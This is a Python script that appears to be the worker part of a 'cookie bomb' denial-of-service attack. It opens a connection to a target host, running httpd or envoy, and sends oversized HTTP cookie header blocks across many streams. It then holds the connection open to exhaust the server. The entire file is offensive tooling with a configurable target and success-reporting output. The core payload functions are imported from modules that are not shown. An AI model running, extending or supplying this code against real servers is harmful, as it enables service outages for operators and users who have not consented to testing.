#!/usr/bin/env python3
"""Single-connection cookie bomb worker for apex_cookie_mp."""
from __future__ import annotations

import argparse
import sys
from pathlib import Path

BENCH = Path(__file__).resolve().parent
sys.path.insert(0, str(BENCH))

from attack_config import CookieAttackConfig  # noqa: E402
from cookie_bomb_enhanced import (  # noqa: E402
    CookieConn,
    bomb_one,
    build_block,
    connect_cookie,
    hold_cookie,
)


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, default=10080)
    p.add_argument("--conn-id", type=int, default=0)
    p.add_argument("--variant", choices=["httpd", "envoy"], default="httpd")
    p.add_argument("--streams", type=int, default=64)
    p.add_argument("--refs", type=int, default=4091)
    p.add_argument("--cookie-value-size", type=int, default=4058)
    p.add_argument("--path", default="/missing")
    p.add_argument("--hold", type=int, default=120)
    p.add_argument("--drip", type=int, default=10)
    p.add_argument("--hold-mode", default="hard_hold")
    p.add_argument("--server-name", default="")
    args = p.parse_args()

    cfg = CookieAttackConfig(
        variant=args.variant,
        streams=args.streams,
        refs=args.refs,
        cookie_value_size=args.cookie_value_size,
        path=args.path,
        hold=args.hold,
        drip=args.drip,
        hold_mode=args.hold_mode,
        server_name=args.server_name or args.host,
    )
    block = build_block(cfg, args.host)
    conn = CookieConn(conn_id=args.conn_id)
    try:
        got = connect_cookie(args.host, args.port, cfg)
        conn.sock = got.sock
        conn.active = True
        ok, wire = bomb_one(conn, block, cfg)
        print(f"WORKER_BOMB_OK conn={args.conn_id} wire={wire} streams={len(conn.stream_ids or [])}", flush=True)
        hold_cookie(conn, cfg)
        print(f"WORKER_OK conn={args.conn_id} wire={wire} active={conn.active}", flush=True)
        return 0 if ok else 1
    except Exception as exc:
        print(f"WORKER_FAIL conn={args.conn_id} err={exc}", flush=True)
        return 2
    finally:
        conn.close()


if __name__ == "__main__":
    raise SystemExit(main())
